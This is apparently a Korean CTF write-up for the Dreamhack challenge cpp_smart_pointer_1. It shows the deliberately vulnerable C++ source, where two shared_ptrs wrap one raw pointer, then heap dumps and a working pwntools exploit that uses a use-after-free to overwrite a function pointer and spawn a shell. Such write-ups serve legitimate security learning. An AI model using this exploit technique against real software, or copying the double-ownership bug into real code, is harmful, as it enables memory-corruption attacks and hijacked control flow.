---
published: true
image: /img
layout: post
title: "[Dreamhack] PWN cpp_smart_pointer_1"
excerpt: "드림핵 포너블 cpp_smart_pointer_1 문제풀이"
tags: [Dreamhack, pwnable, wargame, writeup]
math: true
date: 2023-04-04 18:00
---

이번 문제는 cpp의 스마트 포인터에 대한 내용이다. 삽질을 좀 오래 했는데 삽질 한 것에 비해 좀 쉽게 풀린 문제다.

std::unique_ptr이나 std::shared_ptr과 같은 자료형으로 정의된 스마트 포인터들은 직접 메모리를 동적으로 할당하고 해제하는 일 없이 메모리 관리를 자동으로 해 메모리 릭 등의 취약점이 발생하지 않게 한다. 생각보다 많은 스마트 포인터가 존재하는데 그건 여기서 다루진 않겠다.

cpp에서 객체를 복사할때 shallow copy와 deep copy가 있다. 직역하면 얕은 복사와 깊은 복사이다.

std::make_shared\<int\>() 메서드를 이용하면 객체의 값을 새로운 메모리에 할당해 복사한다. 이것을 deep copy라고 한다.

단순히 값을 = 연산자를 통해 주입하는 경우 새로운 메모리를 할당하는 것이 아닌 대상 객체에 포인터를 복사하게 되어 shallow copy가 발생한다. 이때 원본 객체와 복사된 객체 둘중 하나라도 free가 동작하게 되면 다른 객체가 가리키고 있는 포인터 또한 동시에 해제되어 uaf 버그가 발생한다. 여기서 다른 객체 또한 free를 하면 double free 버그가 발생한다.


문제의 소스코드를 살펴보자.

```c++
// g++ -o pwn-smart-poiner-1 pwn-smart-pointer-1.cpp -no-pie -std=c++11

#include <iostream>
#include <memory>
#include <csignal>
#include <unistd.h>
#include <cstdio>
#include <cstring>
#include <cstdio>
#include <cstdlib>

char* guest_book = "guestbook\x00";

void alarm_handler(int trash)
{
    std::cout << "TIME OUT" << std::endl;
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void print_menu(){
    std::cout << "smart pointer system!" << std::endl;
    std::cout << "1. change smart pointer" << std::endl;
    std::cout << "2. delete smart pointer" << std::endl;
    std::cout << "3. test smart pointer" << std::endl;
    std::cout << "4. write guest book" << std::endl;
    std::cout << "5. view guest book" << std::endl;
    std::cout << "6. exit system" << std::endl;
    std::cout << "[*] select : ";
}

void write_guestbook(){
    std::string data;
    std::cout << "write guestbook : ";
    std::cin >> data;
    guest_book = (char *)malloc(data.length() + 1);
    strcpy(guest_book, data.c_str());
}

void view_guestbook(){
    std::cout << "guestbook data: ";
    std::cout << guest_book << std::endl;
}

void apple(){
    std::cout << "Hi im apple!" << std::endl;
}

void banana(){
    std::cout << "Hi im banana!" << std::endl;
}

void mango(){
    std::cout << "Hi im mango!" << std::endl;
}

void getshell(){
    std::cout << "Hi im shell!" << std::endl;
    std::cout << "what? shell?" << std::endl;
    system("/bin/sh");
}

class Smart{
public:
    Smart(){
        fp = apple;
    }
    Smart(const Smart&){
    }

    void change_function(int select){
        if(select == 1){
            fp = apple;
        } else if(select == 2){
            fp = banana;
        } else if(select == 3){
            fp = mango;
        } else {
            fp = apple;
        }
    }
    void (*fp)(void);
};

void change_pointer(std::shared_ptr<Smart> first){
    int selector = 0;
    std::cout << "1. apple\n2. banana\n3. mango" << std::endl;
    std::cout << "select function for smart pointer: ";
    std::cin >> selector;
    (*first).change_function(selector);
    std::cout << std::endl;
}

int main(){
    initialize();
    int selector = 0;
    Smart *smart = new Smart();
    std::shared_ptr<Smart> src_ptr(smart);
    std::shared_ptr<Smart> new_ptr(smart);
    while(1){
        print_menu();
        std::cin >> selector;
        switch(selector){
            case 1:
                std::cout << "Select pointer(1, 2): ";
                std::cin >> selector;
                if(selector == 1){
                    change_pointer(src_ptr);
                } else if(selector == 2){
                    change_pointer(new_ptr);
                }
                break;
            case 2:
                std::cout << "Select pointer(1, 2): ";
                std::cin >> selector;
                if(selector == 1){
                    src_ptr.reset();
                } else if(selector == 2){
                    new_ptr.reset();
                }
                break;
            case 3:
                std::cout << "Select pointer(1, 2): ";
                std::cin >> selector;
                if(selector == 1){
                    (*src_ptr).fp();
                } else if(selector == 2){
                    (*new_ptr).fp();
                }
                break;
            case 4:
                write_guestbook();
                break;
            case 5:
                view_guestbook();
                break;
            case 6:
                return 0;
                break;
            default:
                break;
        }
    }
}
```

main함수에서 좀 중요하게 볼 부분이 있다.

```
    Smart *smart = new Smart();
    std::shared_ptr<Smart> src_ptr(smart);
    std::shared_ptr<Smart> new_ptr(smart);
```
위 코드 부분인데, Smart 클래스를 smart에 할당한 다음 std::shared_ptr\<Smart\>를 이용해 src_ptr와 new_ptr에 복사한다. 이때 객체를 새롭게 할당 한 것이 아니라, shallow copy가 일어난다.

각 옵션별 기능을 살펴보자.

1번으로 Smart 클래스의 fp의 값을 각 과일별로 바꿀 수 있다. 2번을 통해 .reset()을 통해 해당 객체를 해제한다. 3번을 통해 src_ptr과 new_ptr중 하나를 설정하고 해당 객체의 fp가 가지고 있는 포인터 주소를 실행한다. 4번을 통해서 guest_book 전역 변수에 값을 쓴다. 5번 항목을 통해서 guest_book의 내용을 볼 수 있다.

우선 코드에서 익스플로잇을 트리거 할 수 있는 부분은 case 3번의 fp포인터를 실행하는 부분인 것 같다. 그러면 fp의 값을 바꿀 방법을 생각해야 한다.

main함수 초반 부분에서 src_ptr과 new_ptr에 객체를 생성할 때 shallow copy가 발생했다. 그리고 case 2를 통해서 각각의 ptr을 해제할 수 있다. 그럼 UAF와 Double Free 버그를 생각해 볼 수 있다.

우선 Double Free를 이용해 fp를 조작하려고 했지만 heap 영역 메모리 주소 릭이 안되는 상황이라 성공하지 못했다. 따라서 UAF를 통해 문제를 풀 수 있었다.


시나리오를 짜보자.

src_ptr, new_ptr 둘중 아무거나 상관없다. 나는 new_ptr을 해제할 것이다. 그러면 Smart smart 클래스의 객체가 free되게 되는데 free된 상태의 메모리 주소를 shallow copy로 인해 src_ptr이 가리키고 있게 된다.

이후 write_guestbook에서 memory allocating이 가능하기 때문에 fastbin 규칙으로 해제되었던 부분에 메모리 할당이 가능하다. 이를 통해서 fp부분을 get_shell() 함수 주소로 덮으면 공격에 성공한다.

우선 new_ptr을 해제하고 bin을 살펴보자
```
pwndbg> bin
fastbins
0x20: 0xc2bc50 —▸ 0xc2bc10 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
```
0xc2bc10는 원래 Smart의 fp가 들어있던 부분이였다. new_ptr이 해제되면서 같이 free가 되고 fastbin에 예약되어 있다. src_ptr과 new_ptr의 fp는 같은 곳을 가리키기 때문에 이 시점의 src_ptr은 해제된 위치인 0xc2bc10를 가리키고 있다.

이제 두번의 write_guestbook를 진행하고 메모리 주소를 살펴보자.
```
pwndbg> x/32gx 0xc2bc10
0xc2bc10:       0x0000000000000000      0x0000000000000021
0xc2bc20:       0x000000000040161d      0x0000000000000000
0xc2bc30:       0x0000000000000000      0x0000000000000021
0xc2bc40:       0x0000000000402300      0x0000000100000001
0xc2bc50:       0x0000000000c2bc20      0x0000000000000021
0xc2bc60:       0x000000000040161d      0x0000000000000000
0xc2bc70:       0x0000000000c2bc20      0x0000000000020391
0xc2bc80:       0x0000000000000000      0x0000000000000000
0xc2bc90:       0x0000000000000000      0x0000000000000000
0xc2bca0:       0x0000000000000000      0x0000000000000000
0xc2bcb0:       0x0000000000000000      0x0000000000000000
0xc2bcc0:       0x0000000000000000      0x0000000000000000
0xc2bcd0:       0x0000000000000000      0x0000000000000000
0xc2bce0:       0x0000000000000000      0x0000000000000000
0xc2bcf0:       0x0000000000000000      0x0000000000000000
0xc2bd00:       0x0000000000000000      0x0000000000000000
```

0xc2bc10의 데이터 영역을 보면 get_shell() 함수의 주소인 0x000000000040161d가 정상적으로 들어갔다. 이후 case 3에서 fp를 호출하면 0xc2bc10의 데이터 영역인 0xc2bc20의 포인터 값인 0x40161d가 실행되어 쉘을 획득 할 수 있다.

아래는 최종적으로 나온 익스플로잇 코드다.

```python
from pwn import *
context.update(arch='amd64', os='linux')
#context.log_level = 'debug'

#p = remote("host3.dreamhack.games", 21727);
#p = process("./iofile_vtable_check", env={'LD_PRELOAD':'./libc.so.6'})
p = process("./cpp_smart_pointer_1")
elf = ELF("./cpp_smart_pointer_1")
#libc = ELF("./libc.so.6")

get_shell = 0x40161d

p.sendlineafter(b"[*] select : ", b"2")
p.sendlineafter(b"Select pointer(1, 2): ", b"2")

p.sendlineafter(b"[*] select : ", b"4")
p.sendlineafter(b"write guestbook : ", p64(get_shell))

p.sendlineafter(b"[*] select : ", b"4")
p.sendlineafter(b"write guestbook : ", p64(get_shell))

p.sendlineafter(b"[*] select : ", b"3")
p.sendlineafter(b"Select pointer(1, 2): ", b"1")

p.interactive()
```